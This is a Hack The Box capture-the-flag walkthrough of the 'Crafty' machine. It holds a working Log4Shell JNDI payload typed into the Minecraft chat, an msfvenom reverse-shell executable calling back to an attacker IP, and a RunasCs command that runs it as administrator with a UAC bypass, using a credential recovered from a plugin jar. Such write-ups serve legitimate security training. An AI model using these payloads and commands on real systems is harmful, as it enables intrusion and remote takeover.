# HTB - Crafty

### TL;DR
This is a gaming Windows Server 2019 running Minecraft 1.16.5, which is known to be affected by the Log4Shell vulnerability (CVE-2021-44228). There are several POCs in Github which can be used to exploit the Log4Shell vulnerability and get a foothold in the server. The administrator password is found in a `.jar` file in the file system.<br>

### KEYWORDS
Minecraft, Log4Shell, CVE-2021-44228, Java decompiler.

### REFERENCES
https://www.cvedetails.com/cve/CVE-2021-44228/<br>
https://github.com/kozmer/log4j-shell-poc<br>
https://www.youtube.com/watch?v=7qoPDq41xhQ<br>
https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz<br>
https://tlauncher.org/<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-11 04:05 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up, received user-set (0.081s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
80/tcp    open  http      syn-ack
25565/tcp open  minecraft syn-ack

Nmap done: 1 IP address (1 host up) scanned in 44.87 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p80,25565 -sV -sC -Pn -vv 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-11 04:07 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up, received user-set (0.091s latency).
Scanned at 2024-02-11 04:08:00 EST for 15s

PORT      STATE SERVICE   REASON  VERSION
80/tcp    open  http      syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft syn-ack Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds
```
Update the `/etc/hosts` file and enumerate the site with Firefox. We see information about a Minecraft server running at `play.crafty.htb`. There are no more interaction points with the backend in the website. 

![Untitled000](https://github.com/g1vi/AllTheWriteUps/assets/120142960/f3c78f06-36c8-403c-aad8-8d954aff2230)

In summary, we have found a Minecraft server v1.16.5 running on port 25565.

### USER
Searching for Minecraft 1.16.5 vulnerabilities in the web, we find out that versions from 1.8.8 to 1.18.1 were affected by Log4Shell vulnerability, a critical bug in the Apache log4j java logging library (https://www.cvedetails.com/cve/CVE-2021-44228/)<br>
<br>
If you search in GitHub you will find several POCs for Log4Shell exploitation, and there are also tutorials in Youtube, such as this: https://www.youtube.com/watch?v=7qoPDq41xhQ<br>
<br>
We will use this POC: https://github.com/kozmer/log4j-shell-poc. If you pay attention to documentation, there is an example exploiting the CVE in the Minecraft chat. Note that the `poc.py` cannot be used off-the-self, if you inspect carefully the source code you will see 2 modifications are needed.<br>
<br>
First, the POC is designed to be used in Linux, but since `crafty.htb` is a Windows machine, a first modification is needed to adapt the exploit part to the Windows systems (replace `/etc/sh` with `cmd`.

![Untitled100](https://github.com/g1vi/AllTheWriteUps/assets/120142960/595bc7d5-b4b5-4193-90b8-05d688d1a08f)

Next, according to the author you need to copy your version of Java in the repository root directory. The author provides a link to Oracle but, since registration is required, another one was used: https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz<br>
<br>
Follow the author instructions: unpack the Java package in the repository root folder and rename the directory as `./jdk1.8.0_20`, to match the Java path used in the source code. Alternatively, you can leave the directory named as you want and modify the source code accordingly.<br>
<br>
Once finished, verify Java is successfuly installed.
```markdown
> ./jdk1.8.0_20/bin/java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
java version "1.8.0_202"
Java(TM) SE Runtime Environment (build 1.8.0_202-b08)
Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
```
Now run the exploit.
```markdown
> python3 poc.py --userip <your kali ip here> --webport 8000 --lport 1919

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.xxx.xxx:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```
The POC automatically starts an LDAP server on ports 1389 and also generates a payload called `Exploit.class` which will be served on an HTTP server running on port 8000.<br>

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/744297ee-f20b-4c56-8e29-ab0761d7ceae)

You also need to start a listener on port 1919 (this port can be modified with the `–lport` option).<br>
<br>
The POC provide the payload we need to inject in the Minecraft chat.
```markdown
${jndi:ldap://10.10.xxx.xxx:1389/a}
```
Next step is to join a game in the Minecraft server. For this, download a Minecraft client such as this: https://tlauncher.org/en/download_1/minecraft-1-16-5_12582.html. Choose the version that suits your platform, in this case we will use the `.jar` Linux version available here: https://tlauncher.org/jar<br>
<br>
Unzip and run the client.
```markdown
> java -jar TLauncher-2.895.jar
```
Once the client start, make sure you install the Minecraft version 1.65.5, which is the one that matches the one running in the server.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0781dd16-a360-4968-8270-15dbdcea5f40)

Once the installation finishes, click on "Enter the game". In the startup screen click on "Multiplayer" and add a new server `play.crafty.htb`. Join the server and as soon as the game starts press "T" to open the chat and enter the payload.
```markdown
${jndi:ldap://10.10.xxx.xxx:1389/a}
```
When the payload is sent a reverse shell is received on port 1919, it can be used to get the user flag.

### SYSTEM
Start from the user shell and take the opportunity to enumerate the system.
```markdown
> systeminfo

Host Name:                 CRAFTY
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,369 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,729 MB
```
Locate the file `c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar` in the system. Inspect the file and extract the class `/htb/crafty/playercounter/Playercounter.class`. Decompile using whatever method you like, for example, using an online decompiler: https://www.decompiler.com/

![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/aba40d7b-3590-47c7-9452-d34e004947eb)

Looks like credential `s67u84zKq8IXw` is used to connect to an internal service running on 27015 for management purposes.<br>
<br>
Generate a payload with `msfvenom`
```markdown
> msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.34 lport=9999 -f exe -a x64 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
Transfer `shell.exe` and `runascs.exe` (https://github.com/antonioCoco/RunasCs) to the victim and run them.
```markdown
.\runascs administrator s67u84zKq8IXw shell.exe --bypass-uac
```
A reverse shell is received on port 9999.

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/03317f4e-1784-4e5a-a522-0029093cf0fd)

You are root.
